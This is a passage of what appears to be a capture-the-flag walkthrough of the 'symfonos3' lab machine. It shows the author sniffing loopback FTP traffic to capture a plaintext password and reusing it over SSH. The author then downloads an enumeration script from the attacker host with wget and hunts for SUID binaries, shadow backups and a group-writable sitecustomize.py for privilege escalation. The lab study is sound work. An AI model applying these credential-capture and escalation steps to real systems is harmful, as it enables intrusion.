+u_str  ESTAB      0      0      /var/run/dbus/system_bus_socket 10991                 * 10659
+u_dgr  UNCONN     0      0       * 10644                 * 10643
+u_dgr  UNCONN     0      0       * 10635                 * 8938
+u_str  ESTAB      0      0       * 11687                 * 11688
+u_str  ESTAB      0      0      /run/systemd/journal/stdout 9716                  * 9706
+u_dgr  UNCONN     0      0       * 10643                 * 10644
+u_dgr  UNCONN     0      0       * 9399                  * 8938
+u_str  ESTAB      0      0       * 9706                  * 9716
+u_str  ESTAB      0      0       * 10943                 * 10992
+u_str  ESTAB      0      0      /var/run/dbus/system_bus_socket 10992                 * 10943
+u_str  ESTAB      0      0      /run/systemd/journal/stdout 10709                 * 10708
+u_dgr  UNCONN     0      0       * 8914                  * 8915
+u_dgr  UNCONN     0      0       * 9728                  * 8938
+u_dgr  UNCONN     0      0       * 9286                  * 8910
+u_dgr  UNCONN     0      0       * 9744                  * 9743
+udp    UNCONN     0      0       *:bootpc                *:*
+tcp    LISTEN     0      128     *:ssh                   *:*
+tcp    TIME-WAIT  0      0      127.0.0.1:52422                127.0.0.1:http
+tcp    TIME-WAIT  0      0      127.0.0.1:53322                127.0.0.1:ftp
+tcp    ESTAB      0      2      192.168.56.92:48290                192.168.56.70:https
+tcp    LISTEN     0      128    :::http                 :::*
+tcp    LISTEN     0      32     :::ftp                  :::*
+tcp    LISTEN     0      128    :::ssh                  :::*</code></pre>
+<pre class="shell"><code>cerberus@symfonos3:/tmp$ tcpdump -i lo
+tcpdump -i lo
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+05:28:01.085397 IP localhost.52428 &gt; localhost.http: Flags [S], seq 3978401165, win 43690, options [mss 65495,sackOK,TS val 1505966 ecr 0,nop,wscale 7], length 0
+05:28:01.085419 IP localhost.http &gt; localhost.52428: Flags [S.], seq 1350249147, ack 3978401166, win 43690, options [mss 65495,sackOK,TS val 1505966 ecr 1505966,nop,wscale 7], length 0
+05:28:01.085433 IP localhost.52428 &gt; localhost.http: Flags [.], ack 1, win 342, options [nop,nop,TS val 1505966 ecr 1505966], length 0
+05:28:01.101886 IP localhost.52428 &gt; localhost.http: Flags [P.], seq 1:75, ack 1, win 342, options [nop,nop,TS val 1505974 ecr 1505966], length 74: HTTP: HEAD / HTTP/1.1
+05:28:01.101912 IP localhost.http &gt; localhost.52428: Flags [.], ack 75, win 342, options [nop,nop,TS val 1505974 ecr 1505974], length 0
+05:28:01.102147 IP localhost.http &gt; localhost.52428: Flags [P.], seq 1:252, ack 75, win 342, options [nop,nop,TS val 1505974 ecr 1505974], length 251: HTTP: HTTP/1.1 200 OK
+05:28:01.102386 IP localhost.52428 &gt; localhost.http: Flags [.], ack 252, win 350, options [nop,nop,TS val 1505974 ecr 1505974], length 0
+05:28:01.102556 IP localhost.52428 &gt; localhost.http: Flags [F.], seq 75, ack 252, win 350, options [nop,nop,TS val 1505974 ecr 1505974], length 0
+05:28:01.102615 IP localhost.http &gt; localhost.52428: Flags [F.], seq 252, ack 76, win 342, options [nop,nop,TS val 1505974 ecr 1505974], length 0
+05:28:01.102625 IP localhost.52428 &gt; localhost.http: Flags [.], ack 253, win 350, options [nop,nop,TS val 1505974 ecr 1505974], length 0
+05:28:01.110627 IP localhost.53328 &gt; localhost.ftp: Flags [S], seq 1558929012, win 43690, options [mss 65495,sackOK,TS val 1505974 ecr 0,nop,wscale 7], length 0
+05:28:01.110635 IP localhost.ftp &gt; localhost.53328: Flags [S.], seq 1810234565, ack 1558929013, win 43690, options [mss 65495,sackOK,TS val 1505974 ecr 1505974,nop,wscale 7], length 0
+05:28:01.110642 IP localhost.53328 &gt; localhost.ftp: Flags [.], ack 1, win 342, options [nop,nop,TS val 1505974 ecr 1505974], length 0
+05:28:01.111985 IP localhost.ftp &gt; localhost.53328: Flags [P.], seq 1:56, ack 1, win 342, options [nop,nop,TS val 1505976 ecr 1505974], length 55: FTP: 220 ProFTPD 1.3.5b Server (Debian) [::ffff:127.0.0.1]
+05:28:01.112056 IP localhost.53328 &gt; localhost.ftp: Flags [.], ack 56, win 342, options [nop,nop,TS val 1505976 ecr 1505976], length 0
+05:28:01.112085 IP localhost.53328 &gt; localhost.ftp: Flags [P.], seq 1:13, ack 56, win 342, options [nop,nop,TS val 1505976 ecr 1505976], length 12: FTP: USER hades
+05:28:01.112105 IP localhost.ftp &gt; localhost.53328: Flags [.], ack 13, win 342, options [nop,nop,TS val 1505976 ecr 1505976], length 0
+05:28:01.112561 IP localhost.ftp &gt; localhost.53328: Flags [P.], seq 56:89, ack 13, win 342, options [nop,nop,TS val 1505976 ecr 1505976], length 33: FTP: 331 Password required for hades
+05:28:01.112625 IP localhost.53328 &gt; localhost.ftp: Flags [P.], seq 13:36, ack 89, win 342, options [nop,nop,TS val 1505976 ecr 1505976], length 23: FTP: PASS PTpZTfU4vxgzvRBE
+05:28:01.119775 IP localhost.ftp &gt; localhost.53328: Flags [P.], seq 89:115, ack 36, win 342, options [nop,nop,TS val 1505977 ecr 1505976], length 26: FTP: 230 User hades logged in
+05:28:01.119829 IP localhost.53328 &gt; localhost.ftp: Flags [P.], seq 36:51, ack 115, win 342, options [nop,nop,TS val 1505977 ecr 1505977], length 15: FTP: CWD /srv/ftp/
+05:28:01.120087 IP localhost.ftp &gt; localhost.53328: Flags [P.], seq 115:143, ack 51, win 342, options [nop,nop,TS val 1505978 ecr 1505977], length 28: FTP: 250 CWD command successful
+05:28:01.120978 IP localhost.53328 &gt; localhost.ftp: Flags [F.], seq 51, ack 143, win 342, options [nop,nop,TS val 1505978 ecr 1505978], length 0
+05:28:01.122325 IP localhost.ftp &gt; localhost.53328: Flags [F.], seq 143, ack 52, win 342, options [nop,nop,TS val 1505979 ecr 1505978], length 0
+05:28:01.122333 IP localhost.53328 &gt; localhost.ftp: Flags [.], ack 144, win 342, options [nop,nop,TS val 1505979 ecr 1505979], length 0
+^C
+</code></pre>
+<figure>
+<img src="10.tcpdump-i-lo.png" alt="" /><figcaption>10.tcpdump-i-lo</figcaption>
+</figure>
+<p>Credentials hades:PTpZTfU4vxgzvRBE</p>
+<h3 id="password-reuse">Password reuse?</h3>
+<p>Yes.</p>
+<h2 id="ssh-as-hades">SSH as hades</h2>
+<pre class="shell"><code>ssh hades@$RHOST
+hades@192.168.56.92&#39;s password:
+Linux symfonos3 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+No mail.
+Last login: Sat Jan  8 05:30:50 2022 from 192.168.56.70
+hades@symfonos3:~$ id
+uid=1000(hades) gid=1000(hades) groups=1000(hades),1002(gods)
+hades@symfonos3:~$ whoami
+hades
+hades@symfonos3:~$ who
+hades    pts/0        2022-01-08 05:30 (192.168.56.70)
+hades@symfonos3:~$ hostname
+symfonos3
+hades@symfonos3:~$ date
+Sat Jan  8 05:31:08 CST 2022
+hades@symfonos3:~$ pwd
+/home/hades
+hades@symfonos3:~$ cd
+hades@symfonos3:~$ ls -la
+total 28
+drwxr-xr-x 3 hades hades 4096 Apr  6  2020 .
+drwxr-xr-x 4 root  root  4096 Jul 20  2019 ..
+lrwxrwxrwx 1 root  root     9 Jul 20  2019 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 hades hades  220 Jul 19  2019 .bash_logout
+-rw-r--r-- 1 hades hades 3526 Jul 19  2019 .bashrc
+drwxr-xr-x 2 hades hades 4096 Jul 20  2019 .nano
+-rw-r--r-- 1 hades hades  675 Jul 19  2019 .profile
+-rw-r--r-- 1 hades hades  165 Apr  6  2020 .wget-hsts
+hades@symfonos3:~$ sudo -l
+-bash: sudo: command not found
+hades@symfonos3:~$ wget -q 192.168.56.70/lse.sh
+hades@symfonos3:~$ ls -l lse.sh
+-rw-r--r-- 1 hades hades 0 Jan  8 05:31 lse.sh
+hades@symfonos3:~$ wget -v 192.168.56.70/lse.sh
+--2022-01-08 05:32:00--  http://192.168.56.70/lse.sh
+Connecting to 192.168.56.70:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 43570 (43K) [text/x-sh]
+Saving to: ‘lse.sh.1’
+
+lse.sh.1                        0%[                                               ]       0  --.-KB/s    in 0s
+
+
+Cannot write to ‘lse.sh.1’ (No space left on device).</code></pre>
+<p>Still cannot write to disk.</p>
+<figure>
+<img src="11.ssh-as-hades.png" alt="" /><figcaption>11.ssh-as-hades</figcaption>
+</figure>
+<pre class="shell"><code>hades@symfonos3:~$ groups
+hades gods</code></pre>
+<h3 id="find">Find</h3>
+<h4 id="recent-files">recent files</h4>
+<pre class="shell"><code>hades@symfonos3:~$ find / -type f -not -path &quot;/proc/*&quot; -not -path &quot;/sys/*&quot; -and -mtime -1 -and -not -user root -exec ls -l &quot;{}&quot; \; 2&gt;/dev/null
+-rw-r--r-- 1 hades hades 0 Jan  8 05:31 /home/hades/lse.sh
+-rw-r--r-- 1 hades hades 0 Jan  8 05:32 /home/hades/lse.sh.1</code></pre>
+<h4 id="backups">backups</h4>
+<pre class="shell"><code>hades@symfonos3:~$ find / -type f -name &quot;*bak&quot; -exec ls -lh &quot;{}&quot; \; 2&gt;/dev/null
+-rw------- 1 root root 748 Apr  6  2020 /var/backups/group.bak
+-rw------- 1 root shadow 1.2K Apr  6  2020 /var/backups/shadow.bak
+-rw------- 1 root shadow 624 Apr  6  2020 /var/backups/gshadow.bak
+-rw------- 1 root root 1.6K Jul 20  2019 /var/backups/passwd.bak
+
+hades@symfonos3:~$ find / -type f -name &quot;*backup*&quot; -exec ls -lh &quot;{}&quot; \; 2&gt;/dev/null
+-rw-r--r-- 1 root root 7.8K Jun 16  2019 /lib/modules/4.9.0-9-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
+
+hades@symfonos3:~$ find / -type d -name &quot;*backup*&quot; -exec ls -lh &quot;{}&quot; \; 2&gt;/dev/null
+total 556K
+-rw-r--r-- 1 root root    40K Jan  6 06:25 alternatives.tar.0
+-rw-r--r-- 1 root root    16K Jul 20  2019 apt.extended_states.0
+-rw-r--r-- 1 root root    280 Jul 19  2019 dpkg.diversions.0
+-rw-r--r-- 1 root root    218 Jul 20  2019 dpkg.statoverride.0
+-rw-r--r-- 1 root root   474K Apr  6  2020 dpkg.status.0
+-rw------- 1 root root    748 Apr  6  2020 group.bak
+-rw------- 1 root shadow  624 Apr  6  2020 gshadow.bak
+-rw------- 1 root root   1.6K Jul 20  2019 passwd.bak
+-rw------- 1 root shadow 1.2K Apr  6  2020 shadow.bak</code></pre>
+<h4 id="database">database</h4>
+<pre class="shell"><code>hades@symfonos3:~$ find / -type f -name &quot;database&quot; -exec ls -lh &quot;{}&quot; \; 2&gt;/dev/null
+-rw-r--r-- 1 root root 117K Jul 19  2019 /var/lib/systemd/catalog/database
+
+hades@symfonos3:~$ find / -type d -name &quot;*database*&quot; -exec ls -lh &quot;{}&quot; \; 2&gt;/dev/null
+total 8.0K
+-rw-r--r-- 1 root root 2.2K May 12  2017 changelog.Debian.gz
+-rw-r--r-- 1 root root 1.8K May 12  2017 copyright</code></pre>
+<h4 id="sgid-and-suid">SGID and SUID</h4>
+<pre class="shell"><code>hades@symfonos3:~$ find / -type f -perm -2000 -exec ls -lh &quot;{}&quot; \; 2&gt;/dev/null
+-rwxr-sr-x 1 root shadow 35K May 27  2017 /sbin/unix_chkpwd
+-rwxr-sr-x 1 root mail 19K Jan 17  2017 /usr/bin/dotlockfile
+-rwxr-sr-x 1 root shadow 71K May 17  2017 /usr/bin/chage
+-rwxr-sr-x 1 root ssh 351K Mar  1  2019 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root crontab 40K Oct  7  2017 /usr/bin/crontab
+-rwxr-sr-x 1 root tty 15K Apr 12  2017 /usr/bin/bsd-write
+-rwxr-sr-x 1 root shadow 23K May 17  2017 /usr/bin/expiry
+-rwxr-sr-x 1 root tty 27K Mar  7  2018 /usr/bin/wall
+-rwxr-sr-x 1 root mail 11K Nov 23  2016 /usr/bin/mlock
+
+hades@symfonos3:~$ find / -type f -perm -4000 -exec ls -lh &quot;{}&quot; \; 2&gt;/dev/null
+-rwsr-xr-x 1 root root 996K Sep  3  2019 /usr/sbin/exim4
+-rwsr-xr-x 1 root root 40K May 17  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 40K May 17  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 23K Dec  6  2018 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 49K May 17  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root 75K May 17  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 59K May 17  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 15K Dec  6  2018 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-- 1 root messagebus 42K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 431K Mar  1  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 31K Mar  7  2018 /bin/umount
+-rwsr-xr-x 1 root root 44K Mar  7  2018 /bin/mount
+-rwsr-xr-x 1 root root 60K Nov 10  2016 /bin/ping
+-rwsr-xr-x 1 root root 40K May 17  2017 /bin/su
+</code></pre>
+<h4 id="writable">writable</h4>
+<pre class="shell"><code>hades@symfonos3:~$ find / -writable -not -path &quot;/proc/*&quot; -not -path &quot;/run/*&quot; -not -path &quot;/snap/*&quot; -not -path &quot;/dev/*&quot; -not -path &quot;/usr/lib/*&quot; -not -path &quot;/var/www/html/*&quot; -not -path &quot;/sys/*&quot;  -not -path &quot;/lib/*&quot; 2&gt;/dev/null
+/srv/ftp
+/srv/ftp/statuscheck.txt
+/usr/bin/pdb2.7
+/usr/bin/pdb
+/etc/python2.7/sitecustomize.py
+/var/lock
+/var/mail/hades
+/var/lib/php/sessions
+/var/tmp
+/home/hades
+/home/hades/.bashrc
+/home/hades/.profile
+/home/hades/lse.sh
+/home/hades/lse.sh.1
+/home/hades/.bash_logout
+/home/hades/.bash_history
+/home/hades/.wget-hsts
+/home/hades/.nano
+/home/cerberus/.bash_history
+/tmp
+/tmp/.XIM-unix
+/tmp/.font-unix
+/tmp/.ICE-unix
+/tmp/.Test-unix
+/tmp/.X11-unix
+</code></pre>
+<pre class="shell"><code>hades@symfonos3:~$ find / -writable -group gods -not -path &quot;/proc/*&quot; -not -path &quot;/run/*&quot; -not -path &quot;/snap/*&quot; -not -path &quot;/dev/*&quot; -not -path &quot;/usr/lib/*&quot; -not -path &quot;/var/www/html/*&quot; -not -path &quot;/sys/*&quot;  -not -path &quot;/lib/*&quot; 2&gt;/dev/null
+/etc/python2.7/sitecustomize.py</code></pre>
+<h3 id="etcpython2.7sitecustomize.py">/etc/python2.7/sitecustomize.py</h3>
+<pre class="shell"><code>hades@symfonos3:~$ ls -lh /etc/python2.7/sitecustomize.py
+-rwxrw-r-- 1 root gods 155 Sep 26  2018 /etc/python2.7/sitecustomize.py</code></pre>
+<div class="sourceCode" id="cb72"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb72-1"><a href="#cb72-1" aria-hidden="true"></a><span class="co"># install the apport exception handler if available</span></span>
+<span id="cb72-2"><a href="#cb72-2" aria-hidden="true"></a><span class="cf">try</span>:</span>
+<span id="cb72-3"><a href="#cb72-3" aria-hidden="true"></a>    <span class="im">import</span> apport_python_hook</span>
+<span id="cb72-4"><a href="#cb72-4" aria-hidden="true"></a><span class="cf">except</span> <span class="pp">ImportError</span>:</span>
+<span id="cb72-5"><a href="#cb72-5" aria-hidden="true"></a>    <span class="cf">pass</span></span>
+<span id="cb72-6"><a href="#cb72-6" aria-hidden="true"></a><span class="cf">else</span>:</span>
+<span id="cb72-7"><a href="#cb72-7" aria-hidden="true"></a>    apport_python_hook.install()</span></code></pre></div>
+<figure>
+<img src="12.sitecustomize.png" alt="" /><figcaption>12.sitecustomize</figcaption>
+</figure>
+<p>There is only one file in whole directory.</p>
+<pre class="shell"><code>hades@symfonos3:~$ ls -lAh /etc/python2.7
+total 4.0K
+-rwxrw-r-- 1 root gods 155 Sep 26  2018 sitecustomize.py
+</code></pre>
+<h3 id="processes">processes</h3>
+<pre class="shell"><code>hades@symfonos3:~$ ps -ef
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 03:42 ?        00:00:00 /sbin/init
+root         2     0  0 03:42 ?        00:00:00 [kthreadd]
+root         3     2  0 03:42 ?        00:00:09 [ksoftirqd/0]
+root         5     2  0 03:42 ?        00:00:00 [kworker/0:0H]
+root         7     2  0 03:42 ?        00:00:02 [rcu_sched]
+root         8     2  0 03:42 ?        00:00:00 [rcu_bh]
+root         9     2  0 03:42 ?        00:00:00 [migration/0]
+root        10     2  0 03:42 ?        00:00:00 [lru-add-drain]
+root        11     2  0 03:42 ?        00:00:00 [watchdog/0]
+root        12     2  0 03:42 ?        00:00:00 [cpuhp/0]
+root        13     2  0 03:42 ?        00:00:00 [kdevtmpfs]
+root        14     2  0 03:42 ?        00:00:00 [netns]
+root        15     2  0 03:42 ?        00:00:00 [khungtaskd]
+root        16     2  0 03:42 ?        00:00:00 [oom_reaper]
+root        17     2  0 03:42 ?        00:00:00 [writeback]
+root        18     2  0 03:42 ?        00:00:00 [kcompactd0]
+root        19     2  0 03:42 ?        00:00:00 [ksmd]
+root        21     2  0 03:42 ?        00:00:00 [khugepaged]
+root        22     2  0 03:42 ?        00:00:00 [crypto]
+root        23     2  0 03:42 ?        00:00:00 [kintegrityd]
+root        24     2  0 03:42 ?        00:00:00 [bioset]
+root        25     2  0 03:42 ?        00:00:00 [kblockd]
+root        26     2  0 03:42 ?        00:00:00 [devfreq_wq]
+root        27     2  0 03:42 ?        00:00:00 [watchdogd]
+root        28     2  0 03:42 ?        00:00:00 [kswapd0]
+root        29     2  0 03:42 ?        00:00:00 [vmstat]
+root        41     2  0 03:42 ?        00:00:00 [kthrotld]
+root        42     2  0 03:42 ?        00:00:00 [ipv6_addrconf]
+root        75     2  0 03:42 ?        00:00:00 [ata_sff]
+root        83     2  0 03:42 ?        00:00:00 [kworker/u2:1]
+root       103     2  0 03:42 ?        00:00:00 [scsi_eh_0]
+root       104     2  0 03:42 ?        00:00:00 [scsi_tmf_0]
+root       105     2  0 03:42 ?        00:00:00 [scsi_eh_1]
+root       106     2  0 03:42 ?        00:00:00 [scsi_tmf_1]
+root       108     2  0 03:42 ?        00:00:00 [mpt_poll_0]
+root       109     2  0 03:42 ?        00:00:00 [mpt/0]
+root       110     2  0 03:42 ?        00:00:00 [scsi_eh_2]
+root       111     2  0 03:42 ?        00:00:00 [scsi_tmf_2]
+root       112     2  0 03:42 ?        00:00:00 [bioset]
+root       143     2  0 03:42 ?        00:00:00 [kworker/0:1H]
+root       168     2  0 03:42 ?        00:00:00 [kworker/u3:0]
+root       175     2  0 03:42 ?        00:00:00 [jbd2/sda1-8]
+root       176     2  0 03:42 ?        00:00:00 [ext4-rsv-conver]
+root       202     1  0 03:42 ?        00:00:00 /lib/systemd/systemd-journald
+root       208     2  0 03:42 ?        00:00:00 [kauditd]
+root       230     1  0 03:42 ?        00:00:00 /lib/systemd/systemd-udevd
+root       258     2  0 03:42 ?        00:00:00 [ttm_swap]
+systemd+   299     1  0 03:42 ?        00:00:01 /lib/systemd/systemd-timesyncd
+root       327     1  0 03:42 ?        00:00:00 /usr/sbin/cron -f
+root       328     1  0 03:42 ?        00:00:00 /lib/systemd/systemd-logind
+root       329     1  0 03:42 ?        00:00:00 /usr/sbin/rsyslogd -n
+message+   330     1  0 03:42 ?        00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile
+root       392     1  0 03:42 tty1     00:00:00 /sbin/agetty --noclear tty1 linux
+root       412     1  0 03:42 ?        00:00:00 /sbin/dhclient -nw
+root       448     1  0 03:42 ?        00:00:00 /usr/sbin/sshd -D
+root       519     1  0 03:42 ?        00:00:00 /usr/sbin/apache2 -k start
+hades      589     1  0 03:42 ?        00:00:00 proftpd: (accepting connections)
+root       661     1  0 03:42 ?        00:00:01 /usr/bin/python3 /usr/bin/fail2ban-server -s /var/run/fail2ban/fail2b
+root      7659     2  0 04:39 ?        00:00:00 [kworker/0:2]
+cerberus  9696   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9698   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9699   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9701   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9702   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9703   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9704   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9705   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9706   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9707   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+root     10048   448  0 05:30 ?        00:00:00 sshd: hades [priv]
+hades    10050     1  0 05:30 ?        00:00:00 /lib/systemd/systemd --user
+hades    10051 10050  0 05:30 ?        00:00:00 (sd-pam)
+hades    10057 10048  0 05:30 ?        00:00:00 sshd: hades@pts/0
+hades    10058 10057  0 05:30 pts/0    00:00:00 -bash
+root     10119     2  0 05:35 ?        00:00:00 [kworker/u2:0]
+root     10237     2  0 05:39 ?        00:00:00 [kworker/0:1]
+hades    10315 10058  0 05:48 pts/0    00:00:00 ps -ef
+hades@symfonos3:~$ ps -ef | grep ftp
+hades      589     1  0 03:42 ?        00:00:00 proftpd: (accepting connections)
+hades    10320 10058  0 05:49 pts/0    00:00:00 grep ftp
+hades@symfonos3:~$ ps -ef | grep ssh
+root       448     1  0 03:42 ?        00:00:00 /usr/sbin/sshd -D
+root     10048   448  0 05:30 ?        00:00:00 sshd: hades [priv]
+hades    10057 10048  0 05:30 ?        00:00:00 sshd: hades@pts/0
+hades    10322 10058  0 05:49 pts/0    00:00:00 grep ssh
+hades@symfonos3:~$ ps -ef | grep httpd
+hades    10325 10058  0 05:49 pts/0    00:00:00 grep httpd
+hades@symfonos3:~$ ps -ef | grep apache
+root       519     1  0 03:42 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9696   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9698   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9699   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9701   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9702   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9703   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9704   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9705   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9706   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+cerberus  9707   519  0 05:06 ?        00:00:00 /usr/sbin/apache2 -k start
+hades    10327 10058  0 05:49 pts/0    00:00:00 grep apache
+hades@symfonos3:~$ ps -ef | grep python
+root       661     1  0 03:42 ?        00:00:01 /usr/bin/python3 /usr/bin/fail2ban-server -s /var/run/fail2ban/fail2ban.sock -p /var/run/fail2ban/fail2ban.pid -x -b
+hades    10329 10058  0 05:49 pts/0    00:00:00 grep python
+hades@symfonos3:~$ ps -ef | grep py
+root       661     1  0 03:42 ?        00:00:01 /usr/bin/python3 /usr/bin/fail2ban-server -s /var/run/fail2ban/fail2ban.sock -p /var/run/fail2ban/fail2ban.pid -x -b
+hades    10331 10058  0 05:49 pts/0    00:00:00 grep py
+hades@symfonos3:~$ ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.1 138768  6716 ?        Ss   03:42   0:00 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    03:42   0:00 [kthreadd]
+root         3  0.1  0.0      0     0 ?        S    03:42   0:09 [ksoftirqd/0]
+root         5  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [kworker/0:0H]
+root         7  0.0  0.0      0     0 ?        S    03:42   0:02 [rcu_sched]
+root         8  0.0  0.0      0     0 ?        S    03:42   0:00 [rcu_bh]
+root         9  0.0  0.0      0     0 ?        S    03:42   0:00 [migration/0]
+root        10  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [lru-add-drain]
+root        11  0.0  0.0      0     0 ?        S    03:42   0:00 [watchdog/0]
+root        12  0.0  0.0      0     0 ?        S    03:42   0:00 [cpuhp/0]
+root        13  0.0  0.0      0     0 ?        S    03:42   0:00 [kdevtmpfs]
+root        14  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [netns]
+root        15  0.0  0.0      0     0 ?        S    03:42   0:00 [khungtaskd]
+root        16  0.0  0.0      0     0 ?        S    03:42   0:00 [oom_reaper]
+root        17  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [writeback]
+root        18  0.0  0.0      0     0 ?        S    03:42   0:00 [kcompactd0]
+root        19  0.0  0.0      0     0 ?        SN   03:42   0:00 [ksmd]
+root        21  0.0  0.0      0     0 ?        SN   03:42   0:00 [khugepaged]
+root        22  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [crypto]
+root        23  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [kintegrityd]
+root        24  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [bioset]
+root        25  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [kblockd]
+root        26  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [devfreq_wq]
+root        27  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [watchdogd]
+root        28  0.0  0.0      0     0 ?        S    03:42   0:00 [kswapd0]
+root        29  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [vmstat]
+root        41  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [kthrotld]
+root        42  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [ipv6_addrconf]
+root        75  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [ata_sff]
+root        83  0.0  0.0      0     0 ?        S    03:42   0:00 [kworker/u2:1]
+root       103  0.0  0.0      0     0 ?        S    03:42   0:00 [scsi_eh_0]
+root       104  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [scsi_tmf_0]
+root       105  0.0  0.0      0     0 ?        S    03:42   0:00 [scsi_eh_1]
+root       106  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [scsi_tmf_1]
+root       108  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [mpt_poll_0]
+root       109  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [mpt/0]
+root       110  0.0  0.0      0     0 ?        S    03:42   0:00 [scsi_eh_2]
+root       111  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [scsi_tmf_2]
+root       112  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [bioset]
+root       143  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [kworker/0:1H]
+root       168  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [kworker/u3:0]
+root       175  0.0  0.0      0     0 ?        S    03:42   0:00 [jbd2/sda1-8]
+root       176  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [ext4-rsv-conver]
+root       202  0.0  0.1  42964  5384 ?        Ss   03:42   0:00 /lib/systemd/systemd-journald
+root       208  0.0  0.0      0     0 ?        S    03:42   0:00 [kauditd]
+root       230  0.0  0.0  45920  3944 ?        Ss   03:42   0:00 /lib/systemd/systemd-udevd
+root       258  0.0  0.0      0     0 ?        S&lt;   03:42   0:00 [ttm_swap]
+systemd+   299  0.0  0.1 127284  4072 ?        Ssl  03:42   0:01 /lib/systemd/systemd-timesyncd
+root       327  0.0  0.0  29664  2864 ?        Ss   03:42   0:00 /usr/sbin/cron -f
+root       328  0.0  0.1  46532  4720 ?        Ss   03:42   0:00 /lib/systemd/systemd-logind
+root       329  0.0  0.0 250112  3296 ?        Ssl  03:42   0:00 /usr/sbin/rsyslogd -n
+message+   330  0.0  0.0  45112  3700 ?        Ss   03:42   0:00 /usr/bin/dbus-daemon --system --address=systemd: --n
+root       392  0.0  0.0  14524  1724 tty1     Ss+  03:42   0:00 /sbin/agetty --noclear tty1 linux
+root       412  0.0  0.0  20480  3004 ?        Ss   03:42   0:00 /sbin/dhclient -nw
+root       448  0.0  0.1  69956  6260 ?        Ss   03:42   0:00 /usr/sbin/sshd -D
+root       519  0.0  1.1 489312 46860 ?        Ss   03:42   0:00 /usr/sbin/apache2 -k start
+hades      589  0.0  0.1 124600  4356 ?        Ss   03:42   0:00 proftpd: (accepting connections)
+root       661  0.0  0.4 294308 17324 ?        Sl   03:42   0:01 /usr/bin/python3 /usr/bin/fail2ban-server -s /var/ru
+root      7659  0.0  0.0      0     0 ?        S    04:39   0:00 [kworker/0:2]
+cerberus  9696  0.0  0.3 489392 13600 ?        S    05:06   0:00 /usr/sbin/apache2 -k start
+cerberus  9698  0.0  0.3 489392 13600 ?        S    05:06   0:00 /usr/sbin/apache2 -k start
+cerberus  9699  0.0  0.3 489392 13600 ?        S    05:06   0:00 /usr/sbin/apache2 -k start
